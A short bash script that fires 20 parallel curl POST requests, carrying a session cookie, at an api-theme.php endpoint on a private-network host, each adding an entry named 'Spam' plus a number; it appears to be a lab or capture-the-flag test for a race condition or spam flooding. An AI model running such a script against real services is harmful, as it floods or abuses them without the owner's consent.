#!/bin/bash

TARGET=http://192.168.48.48:8082
COOKIE="lusha=100.this_is_fake"

if [ -n "$1" ]; then
	TARGET=$1
fi

if [ -n "$2" ]; then
	COOKIE=$2
fi

max_processes=20
for ((i=0; i<$max_processes; i++))
do 
    curl --data "action=ADD&idea=Spam${i}" --cookie "${COOKIE}" $TARGET/api-theme.php &
done
